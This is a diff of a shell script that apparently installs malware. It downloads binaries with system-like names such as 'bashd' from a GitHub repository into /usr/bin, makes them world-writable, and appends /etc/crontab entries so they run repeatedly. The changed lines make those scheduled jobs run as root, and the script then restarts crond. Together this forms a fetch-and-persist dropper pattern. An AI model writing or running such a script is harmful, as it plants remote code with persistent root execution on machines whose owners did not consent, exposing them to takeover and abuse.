@@ -13,13 +13,13 @@ chmod 777 /usr/bin/soexec
 wget https://github.com/myvulweb/fabu/raw/master/bashd -O /usr/bin/bashd
 chmod 777 /usr/bin/bashd
 
-echo '* */12 * * * /usr/bin/libhost.sh'>>/etc/crontab
+echo '* */12 * * * root /usr/bin/libhost.sh'>>/etc/crontab
 
-echo '* */24 * * * /usr/bin/soexec.sh'>>/etc/crontab
+echo '* */24 * * * root /usr/bin/soexec.sh'>>/etc/crontab
 
 #exec 0:00-8:00
-echo '* */0 * * * /usr/bin/bashd'>>/etc/crontab
-echo '* */8 * * * /usr/bin/bashd.sh'>>/etc/crontab
+echo '* */0 * * * root /usr/bin/bashd'>>/etc/crontab
+echo '* */8 * * * root /usr/bin/bashd.sh'>>/etc/crontab
 
 service crond restart
 
